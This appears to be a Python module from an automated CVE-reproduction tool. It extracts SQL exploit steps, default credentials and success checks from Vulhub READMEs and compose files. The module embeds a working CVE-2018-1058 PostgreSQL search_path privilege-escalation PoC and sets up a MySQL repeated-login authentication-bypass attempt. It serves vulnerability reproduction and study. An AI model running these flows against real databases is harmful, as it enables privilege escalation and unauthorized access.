"""Extract database execution_spec from README / PoC text.

优先从 Vulhub README 的 ```sql``` 代码块提取；并尽量从说明文字中识别
engine、默认账号和 oracle 线索。
"""

from __future__ import annotations

import re
from pathlib import Path
from typing import Any

from cve_hunter.executors.base import PROTOCOL_DATABASE, build_execution_spec


# 仅匹配显式 SQL 语言标记，或内容明显是 SQL 的代码块。
_SQL_FENCED = re.compile(
    r"```(?:sql|postgresql|postgres|mysql|plsql|pgsql)\s*\n([\s\S]*?)```",
    re.IGNORECASE,
)
_ANY_FENCED = re.compile(r"```[a-zA-Z0-9_-]*\s*\n([\s\S]*?)```", re.IGNORECASE)
_SQL_START = re.compile(
    r"^\s*(SELECT|INSERT|UPDATE|DELETE|CREATE|DROP|COPY|ALTER|WITH|DO|CALL|GRANT|REVOKE)\b",
    re.IGNORECASE,
)
_ENGINE_PATTERNS = (
    ("postgres", re.compile(r"\b(postgresql|postgres|psql)\b", re.I)),
    ("mysql", re.compile(r"\b(mysql|mariadb)\b", re.I)),
)
_USER_PASS = re.compile(
    r"(?:账号|用户|user|username)\s*[/与和:：]?\s*([A-Za-z0-9_.-]+)\s*[/，, ]+\s*(?:密码|password)\s*[/为:：]?\s*([A-Za-z0-9_.@-]+)",
    re.I,
)
_PORT = re.compile(r"端口\s*(\d{2,5})|port\s+(\d{2,5})", re.I)
_ENV_PASSWORD = re.compile(
    r"(?:POSTGRES_PASSWORD|MYSQL_ROOT_PASSWORD|MYSQL_PASSWORD)\s*[=:：]\s*([^\s\"']+)",
    re.I,
)
_SIMPLE_USER_PASS = re.compile(
    r"(?:账号密码|用户名密码|默认账号密码)\s*(?:为|是|:|：)?\s*([A-Za-z0-9_.-]+)\s*/\s*([A-Za-z0-9_.@-]+)",
    re.I,
)


def resolve_database_target(
    *,
    engine: str,
    env_target: str = "",
    user: str = "",
    password: str = "",
    database: str = "",
    port: int | None = None,
) -> str:
    """把环境推断出的 http://host:port 补成数据库 DSN。

    若 env_target 已是 DSN，则优先保留其 host/port（以及未显式覆盖的账号库名），
    再用传入的 user/password/database 覆盖——这样多会话可共享地址、各自账号。
    """
    from urllib.parse import urlparse, unquote

    engine_name = (engine or "postgres").strip().lower()
    if engine_name in {"postgresql", "pgsql"}:
        engine_name = "postgres"
    default_port = 5432 if engine_name.startswith("postgres") else 3306
    default_user = user or ("postgres" if engine_name.startswith("postgres") else "root")
    # password="" 是合法空密码；仅 None 才用引擎默认
    if password is None:
        default_password = "postgres" if engine_name.startswith("postgres") else ""
    else:
        default_password = password
    default_db = database or ("postgres" if engine_name.startswith("postgres") else "")

    text = str(env_target or "").strip()
    host = "127.0.0.1"
    resolved_port = int(port or default_port)

    if text.startswith(("mysql://", "postgres://", "postgresql://", "mariadb://")):
        parsed = urlparse(text)
        host = parsed.hostname or host
        resolved_port = int(parsed.port or resolved_port)
        # 仅当调用方未显式传 user/password/database 时，才回退 DSN 内账号
        if not user and parsed.username:
            default_user = unquote(parsed.username)
        if password is None and parsed.password is not None:
            default_password = unquote(parsed.password)
        if not database and parsed.path:
            default_db = parsed.path.lstrip("/")
    elif text:
        cleaned = text.replace("http://", "").replace("https://", "").replace("tcp://", "")
        cleaned = cleaned.split("/")[0]
        if ":" in cleaned:
            host_part, port_part = cleaned.rsplit(":", 1)
            host = host_part or host
            if port_part.isdigit():
                resolved_port = int(port_part)
        elif cleaned:
            host = cleaned

    auth = default_user
    if default_password:
        auth = f"{default_user}:{default_password}"
    db_part = f"/{default_db}" if default_db else ""
    return f"{engine_name}://{auth}@{host}:{resolved_port}{db_part}"


def extract_sql_statements(text: str) -> list[str]:
    """Extract ordered SQL statements from markdown/text."""
    if not text:
        return []
    statements: list[str] = []
    for match in _SQL_FENCED.finditer(text):
        statements.extend(_split_sql(match.group(1).strip()))
    if not statements:
        # unlabeled fenced blocks that look like SQL (not shell/docker)
        for match in _ANY_FENCED.finditer(text):
            block = match.group(1).strip()
            if not block or re.search(r"\b(docker|compose|curl|wget|bash|npm|pip)\b", block, re.I):
                continue
            if _SQL_START.search(block):
                statements.extend(_split_sql(block))
    if not statements:
        for line in text.splitlines():
            stripped = line.strip().rstrip(";")
            if _SQL_START.match(stripped):
                statements.append(stripped + ("" if stripped.endswith(";") else ";"))
    return _dedupe(statements)


def extract_database_execution_spec(
    text: str,
    *,
    cve_id: str = "",
    target: str = "",
    default_engine: str = "",
    compose_credentials: dict[str, str] | None = None,
) -> dict[str, Any] | None:
    """Build a database execution_spec from documentation text."""
    sqls = extract_sql_statements(text)
    engine = default_engine or _infer_engine(text) or ""
    auth_bypass = _infer_auth_bypass(text, engine or "mysql")
    multi = _infer_search_path_multi_session(text, engine or "postgres", cve_id=cve_id)
    if not sqls and not auth_bypass and not multi:
        return None

    if not engine:
        if auth_bypass:
            engine = "mysql"
        else:
            engine = "postgres"
    user, password = _infer_credentials(text, engine)
    # compose 环境变量可覆盖默认超户密码（如 POSTGRES_PASSWORD=vulhub_secret）
    creds = dict(compose_credentials or {})
    if engine.startswith("postgres"):
        if creds.get("postgres_password"):
            password = creds["postgres_password"]
            user = creds.get("postgres_user") or user or "postgres"
        if creds.get("postgres_db"):
            pass  # handled below
    elif engine.startswith("mysql"):
        if creds.get("mysql_root_password") is not None:
            password = creds["mysql_root_password"]
            user = "root"

    port = _infer_port(text, engine)
    schema_sql: list[str] = []
    setup_sql: list[str] = []
    trigger_sql: list[str] = []
    cleanup_sql: list[str] = []
    sessions: list[dict[str, Any]] | None = None
    oracle: dict[str, Any]
    action = ""
    if multi:
        action = "multi_session"
        # compose 凭证覆盖多会话账号
        if creds.get("postgres_password"):
            multi["admin_password"] = creds["postgres_password"]
            multi["admin_user"] = creds.get("postgres_user") or multi.get("admin_user") or "postgres"
        if creds.get("app_user"):
            for session in multi["sessions"]:
                if session.get("name") == "attacker":
                    session["user"] = creds["app_user"]
                    if creds.get("app_password"):
                        session["password"] = creds["app_password"]
                    if creds.get("app_database"):
                        session["database"] = creds["app_database"]
                        multi["database"] = creds["app_database"]
        for session in multi["sessions"]:
            if session.get("name") == "superuser":
                session["user"] = multi.get("admin_user") or session.get("user") or "postgres"
                session["password"] = multi.get("admin_password") or session.get("password") or "postgres"
                session["database"] = multi.get("database") or session.get("database") or "postgres"
        sessions = multi["sessions"]
        oracle = multi["oracle"]
        user = multi.get("admin_user") or user
        password = multi.get("admin_password") or password
        dbname = multi.get("database") or ("vulhub" if "vulhub" in text.lower() else "postgres")
        # 顶层 target 用超户，便于健康连接与归档
        trigger_sql = []
        schema_sql = []
    elif auth_bypass and not sqls:
        # MySQL/MariaDB 鉴权绕过（如 CVE-2012-2122）：无 SQL，靠错误密码反复登录
        action = "auth_bypass"
        user = str(auth_bypass.get("username") or user or "root")
        # DSN 里的密码不用于正确登录；保留文档中的正确密码仅作备注
        password = str(auth_bypass.get("password") or "wrong")
        trigger_sql = ["SELECT USER();", "SELECT VERSION();"]
        oracle = {"type": "auth_success", "expect": "auth_bypass_success"}
        dbname = "postgres" if engine.startswith("postgres") else ""
    else:
        schema_sql, setup_sql, trigger_sql, cleanup_sql = _partition_sql(sqls)
        oracle = _infer_oracle(text, trigger_sql)
        dbname = "postgres" if engine.startswith("postgres") else ""
        if engine.startswith("postgres") and creds.get("postgres_db"):
            dbname = creds["postgres_db"]

    if multi:
        dbname = multi.get("database") or dbname

    if not target:
        target = resolve_database_target(
            engine=engine,
            user=user,
            password=password,
            database=dbname,
            port=port,
        )
    else:
        target = resolve_database_target(
            engine=engine,
            env_target=target,
            user=user,
            password=password,
            database=dbname,
            port=port,
        )

    # 多会话 DSN 补 host/port（账号保持 session 自身）
    if sessions:
        for session in sessions:
            s_user = str(session.get("user") or user)
            s_pass = str(session.get("password") if session.get("password") is not None else password)
            s_db = str(session.get("database") or dbname)
            session["target"] = resolve_database_target(
                engine=engine,
                env_target=target,
                user=s_user,
                password=s_pass,
                database=s_db,
                port=port,
            )

    return build_execution_spec(
        protocol=PROTOCOL_DATABASE,
        cve_id=cve_id,
        engine=engine,
        target=target,
        schema_sql=schema_sql,
        setup_sql=setup_sql,
        trigger_sql=trigger_sql,
        cleanup_sql=cleanup_sql,
        oracle=oracle,
        action=action,
        auth_bypass=auth_bypass,
        sessions=sessions,
        notes="extracted_from_text",
    )


def extract_database_spec_from_paths(
    paths: list[Path],
    *,
    cve_id: str = "",
    target: str = "",
) -> dict[str, Any] | None:
    """Try multiple README/PoC files and return the first usable DB spec."""
    for path in paths:
        try:
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        engine_hint = ""
        lowered = str(path).lower()
        if "postgres" in lowered:
            engine_hint = "postgres"
        elif "mysql" in lowered or "mariadb" in lowered:
            engine_hint = "mysql"
        compose_creds = extract_compose_db_credentials(path.parent)
        # 同目录 README.zh-cn / README 合并线索
        merged = text
        for sibling_name in ("README.zh-cn.md", "README.md", "README.zh_cn.md"):
            sibling = path.parent / sibling_name
            if sibling.is_file() and sibling.resolve() != path.resolve():
                try:
                    merged = merged + "\n" + sibling.read_text(encoding="utf-8", errors="ignore")
                except OSError:
                    pass
        spec = extract_database_execution_spec(
            merged,
            cve_id=cve_id,
            target=target,
            default_engine=engine_hint,
            compose_credentials=compose_creds,
        )
        if spec:
            spec["source_path"] = str(path)
            if compose_creds:
                spec["compose_credentials"] = compose_creds
            return spec
    return None


def extract_compose_db_credentials(directory: Path | str) -> dict[str, str]:
    """从 docker-compose.yml environment 提取数据库账号密码。"""
    root = Path(directory)
    result: dict[str, str] = {}
    for name in ("docker-compose.yml", "docker-compose.yaml", "compose.yml", "compose.yaml"):
        compose = root / name
        if not compose.is_file():
            continue
        try:
            text = compose.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        # 简单键值抽取，避免强依赖 yaml 结构差异
        patterns = {
            "postgres_password": r"POSTGRES_PASSWORD\s*[:=]\s*['\"]?([^\s'\"#]+)",
            "postgres_user": r"POSTGRES_USER\s*[:=]\s*['\"]?([^\s'\"#]+)",
            "postgres_db": r"POSTGRES_DB\s*[:=]\s*['\"]?([^\s'\"#]+)",
            "mysql_root_password": r"MYSQL_ROOT_PASSWORD\s*[:=]\s*['\"]?([^\s'\"#]+)",
            "mysql_password": r"MYSQL_PASSWORD\s*[:=]\s*['\"]?([^\s'\"#]+)",
            "mysql_user": r"MYSQL_USER\s*[:=]\s*['\"]?([^\s'\"#]+)",
            "mysql_database": r"MYSQL_DATABASE\s*[:=]\s*['\"]?([^\s'\"#]+)",
        }
        for key, pattern in patterns.items():
            match = re.search(pattern, text, re.I)
            if match:
                result[key] = match.group(1)
        # 也扫 init 脚本里的 CREATE USER
        for init_name in ("init.sh", "init.sql", "docker-entrypoint-initdb.d"):
            init_path = root / init_name
            if init_path.is_file():
                try:
                    init_text = init_path.read_text(encoding="utf-8", errors="ignore")
                except OSError:
                    init_text = ""
                user_match = re.search(
                    r"CREATE\s+USER\s+[\"']?([A-Za-z0-9_]+)[\"']?\s+WITH\s+PASSWORD\s+[\"']([^\"']+)[\"']",
                    init_text,
                    re.I,
                )
                if user_match:
                    result.setdefault("app_user", user_match.group(1))
                    result.setdefault("app_password", user_match.group(2))
                db_match = re.search(
                    r"CREATE\s+DATABASE\s+[\"']?([A-Za-z0-9_]+)[\"']?",
                    init_text,
                    re.I,
                )
                if db_match:
                    result.setdefault("app_database", db_match.group(1))
        if result:
            break
    return result


def _split_sql(block: str) -> list[str]:
    cleaned = []
    for line in block.splitlines():
        if line.strip().startswith("--"):
            continue
        cleaned.append(line)
    text = "\n".join(cleaned).strip()
    if not text:
        return []
    parts = re.split(r";\s*\n|;\s*$", text)
    statements = []
    for part in parts:
        sql = part.strip()
        if not sql:
            continue
        if not sql.endswith(";"):
            sql += ";"
        statements.append(sql)
    return statements


def _partition_sql(sqls: list[str]) -> tuple[list[str], list[str], list[str], list[str]]:
    schema_sql: list[str] = []
    setup_sql: list[str] = []
    trigger_sql: list[str] = []
    cleanup_sql: list[str] = []
    for sql in sqls:
        upper = sql.upper()
        if upper.startswith("DROP "):
            cleanup_sql.append(sql)
            # DROP often appears before CREATE in demos; keep as setup prelude too
            if "IF EXISTS" in upper:
                schema_sql.append(sql)
        elif upper.startswith("CREATE "):
            schema_sql.append(sql)
        elif upper.startswith(("INSERT ", "UPDATE ", "ALTER ", "GRANT ", "SET ")):
            setup_sql.append(sql)
        else:
            # COPY/SELECT/DO/CALL etc. treated as trigger
            trigger_sql.append(sql)
    if not trigger_sql and setup_sql:
        trigger_sql = setup_sql[-1:]
        setup_sql = setup_sql[:-1]
    if not trigger_sql and schema_sql:
        # last non-drop statement as trigger fallback
        for sql in reversed(schema_sql):
            if not sql.upper().startswith("DROP "):
                trigger_sql = [sql]
                break
    return schema_sql, setup_sql, trigger_sql, cleanup_sql


def _infer_engine(text: str) -> str:
    for name, pattern in _ENGINE_PATTERNS:
        if pattern.search(text):
            return name
    return ""


def _infer_credentials(text: str, engine: str) -> tuple[str, str]:
    match = _USER_PASS.search(text)
    if match:
        return match.group(1), match.group(2)
    match = _SIMPLE_USER_PASS.search(text)
    if match:
        return match.group(1), match.group(2)
    env_pw = _ENV_PASSWORD.search(text)
    if env_pw:
        if engine.startswith("postgres"):
            return "postgres", env_pw.group(1)
        return "root", env_pw.group(1)
    if engine.startswith("postgres"):
        return "postgres", "postgres"
    return "root", ""


def _infer_port(text: str, engine: str) -> int:
    match = _PORT.search(text)
    if match:
        return int(match.group(1) or match.group(2))
    return 5432 if engine.startswith("postgres") else 3306


def _infer_oracle(text: str, trigger_sql: list[str]) -> dict[str, Any]:
    joined = "\n".join(trigger_sql).upper()
    # COPY ... PROGRAM / command execution often verified by SELECT output markers
    if "FROM PROGRAM" in joined or "COPY " in joined:
        # id command commonly used in vulhub demos
        return {"type": "result_contains", "expect": "uid="}
    if "UPDATEXML" in joined or "EXTRACTVALUE" in joined:
        return {"type": "error_pattern", "expect": "XPATH syntax error"}
    if re.search(r"\b(id|whoami|uname)\b", "\n".join(trigger_sql), re.I):
        return {"type": "result_contains", "expect": "uid="}
    # default: any successful trigger execution is weak; require non-empty rows if SELECT
    if any(sql.upper().lstrip().startswith("SELECT") for sql in trigger_sql):
        return {"type": "row_count", "min_rows": 1}
    return {"type": "error_pattern", "expect": ""}


_SEARCH_PATH_MARKERS = re.compile(
    r"(search_path|CVE-2018-1058|提权|privilege\s+escalation|普通用户|超级用户|"
    r"pg_dump|array_to_string|pg_shadow|dblink_connect)",
    re.I,
)
_LOW_PRIV_USER = re.compile(
    r"(?:普通用户|regular\s+user|username)\s*[`\"']?([A-Za-z0-9_]+)[`\"']?"
    r"(?:\s*[/：:]\s*[`\"']?([A-Za-z0-9_]+)[`\"']?)?",
    re.I,
)
_VULHUB_USER = re.compile(r"\bvulhub\s*[/：:]\s*vulhub\b|\busername\s+vulhub\b", re.I)


def _infer_search_path_multi_session(
    text: str,
    engine: str,
    *,
    cve_id: str = "",
) -> dict[str, Any] | None:
    """识别 PostgreSQL search_path 提权（CVE-2018-1058）并构造多会话简化 PoC。

    完整 vulhub 路径依赖外连 dblink + pg_dump；本地闭环采用：
    1) 低权用户在 public 植入恶意函数并写 marker 表
    2) 超户 SET search_path TO public, pg_catalog 后调用同名函数
    3) oracle: marker 行包含触发标记
    """
    if not text:
        return None
    engine_name = (engine or "").lower()
    if engine_name and not engine_name.startswith("postgres"):
        # 仅当文本明确是 postgres 时才继续
        if not re.search(r"\b(postgresql|postgres|psql)\b", text, re.I):
            return None
    cve_upper = (cve_id or "").upper()
    if cve_upper != "CVE-2018-1058" and not _SEARCH_PATH_MARKERS.search(text):
        return None
    # 需要同时有“普通用户/提权/search_path/array_to_string”等强信号，避免误伤
    strong = 0
    if re.search(r"search_path|array_to_string|pg_dump|pg_shadow", text, re.I):
        strong += 1
    if re.search(r"普通用户|超级用户|privilege|提权", text, re.I):
        strong += 1
    if cve_upper == "CVE-2018-1058":
        strong += 2
    if strong < 2:
        return None

    admin_user, admin_password = _infer_credentials(text, "postgres")
    # compose 常见 POSTGRES_PASSWORD
    env_pw = _ENV_PASSWORD.search(text)
    if env_pw:
        admin_password = env_pw.group(1)
    low_user, low_password = "vulhub", "vulhub"
    if _VULHUB_USER.search(text):
        low_user, low_password = "vulhub", "vulhub"
    else:
        match = _LOW_PRIV_USER.search(text)
        if match:
            low_user = match.group(1)
            if match.group(2):
                low_password = match.group(2)
    database = "vulhub" if "vulhub" in text.lower() else "postgres"
    marker = "cve-2018-1058-triggered"

    attacker_sql_schema = [
        "CREATE TABLE IF NOT EXISTS public.marker(id int, note text);",
        "DELETE FROM public.marker;",
        "DROP FUNCTION IF EXISTS public.array_to_string(anyarray, text);",
        f"""
CREATE OR REPLACE FUNCTION public.array_to_string(anyarray, text)
RETURNS text
LANGUAGE sql
VOLATILE
AS $$
  INSERT INTO public.marker(id, note) VALUES (999, '{marker}');
  SELECT pg_catalog.array_to_string($1, $2);
$$;
""".strip(),
    ]
    superuser_trigger = [
        "SET search_path TO public, pg_catalog;",
        "SELECT array_to_string(ARRAY['a','b'], ',');",
        "SELECT id, note FROM public.marker WHERE note LIKE '%triggered%';",
    ]
    cleanup = [
        "DROP FUNCTION IF EXISTS public.array_to_string(anyarray, text);",
        "DROP TABLE IF EXISTS public.marker;",
    ]
    sessions = [
        {
            "name": "attacker",
            "user": low_user,
            "password": low_password,
            "database": database,
            "schema_sql": attacker_sql_schema,
            "setup_sql": [],
            "trigger_sql": [],
            "cleanup_sql": [],
        },
        {
            "name": "superuser",
            "user": admin_user or "postgres",
            "password": admin_password or "postgres",
            "database": database,
            "schema_sql": [],
            "setup_sql": [],
            "trigger_sql": superuser_trigger,
            "cleanup_sql": cleanup,
        },
    ]
    return {
        "sessions": sessions,
        "oracle": {
            "type": "result_contains",
            "expect": marker,
            "session": "superuser",
        },
        "admin_user": admin_user or "postgres",
        "admin_password": admin_password or "postgres",
        "database": database,
    }


_AUTH_BYPASS_MARKERS = re.compile(
    r"(身份认证绕过|认证绕过|authentication\s+bypass|memcmp\(\)|-pwrong|wrong\s+password|"
    r"for\s+i\s+in\s+`?seq|不断尝试|反复尝试|brute.?force.*login|login\s+bypass)",
    re.I,
)
_MYSQL_CLI_LOOP = re.compile(
    r"mysql\s+-u(?P<user>[A-Za-z0-9_.-]+)\s+-p(?P<password>\S+)\s+-h\s+\S+(?:\s+-P\s*(?P<port>\d+))?",
    re.I,
)
_SEQ_ATTEMPTS = re.compile(r"seq\s+1\s+(\d{2,5})", re.I)


def _infer_auth_bypass(text: str, engine: str) -> dict[str, Any] | None:
    """识别 MySQL/MariaDB 鉴权绕过类复现（无 SQL 代码块）。"""
    if not text:
        return None
    engine_name = (engine or "").lower()
    looks_mysql = (
        engine_name.startswith("mysql")
        or engine_name.startswith("mariadb")
        or bool(re.search(r"\b(mysql|mariadb)\b", text, re.I))
    )
    if not looks_mysql:
        return None
    if not _AUTH_BYPASS_MARKERS.search(text):
        return None

    user = "root"
    wrong_password = "wrong"
    max_attempts = 1000
    cli = _MYSQL_CLI_LOOP.search(text)
    if cli:
        user = cli.group("user") or user
        wrong_password = cli.group("password") or wrong_password
    seq = _SEQ_ATTEMPTS.search(text)
    if seq:
        try:
            max_attempts = max(50, min(int(seq.group(1)), 5000))
        except ValueError:
            pass
    # 文档中的正确密码仅作备注，不用于绕过路径
    correct_user, correct_password = _infer_credentials(text, "mysql")
    return {
        "username": user or correct_user or "root",
        "password": wrong_password,
        "wrong_password": wrong_password,
        "max_attempts": max_attempts,
        "correct_password_hint": correct_password if correct_password and correct_password != wrong_password else "",
    }


def _dedupe(items: list[str]) -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for item in items:
        key = re.sub(r"\s+", " ", item).strip().lower()
        if key in seen:
            continue
        seen.add(key)
        out.append(item)
    return out
